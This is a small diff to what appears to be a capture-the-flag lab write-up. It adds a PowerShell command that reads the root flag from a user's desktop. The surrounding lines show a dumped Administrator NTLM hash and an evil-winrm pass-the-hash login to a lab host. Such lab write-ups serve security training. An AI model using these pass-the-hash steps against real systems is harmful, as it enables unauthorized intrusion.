@@ -524,6 +524,10 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790b
 evil-winrm -i 10.129.28.66 -u Administrator -H f29e9c014295b9b32139b09a2790be3b
 ```
 
+```
+Get-Content C:\Users\max.palmer\Desktop\root.txt
+```
+
 <img width="1221" height="546" alt="image" src="https://github.com/user-attachments/assets/649b7f46-8506-488c-92e4-d2b7249d6f32" />
 
 
